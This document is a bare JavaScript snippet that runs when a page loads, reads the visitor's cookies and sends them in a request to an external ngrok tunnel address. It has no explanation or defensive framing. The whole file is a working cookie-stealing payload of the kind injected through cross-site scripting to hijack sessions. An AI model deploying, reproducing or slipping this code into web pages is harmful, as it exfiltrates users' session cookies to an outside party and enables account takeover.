document.addEventListener("DOMContentLoaded", () => {
    const cookieValue = encodeURIComponent(document.cookie);
    fetch('https://32dd-191-82-239-19.ngrok-free.app/?cookie='+cookieValue, {
        method: 'GET',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
    })
    .then(response => response.text())
    .then(data => console.log("Response:", data))
    .catch(error => console.error("Error:", error));
});

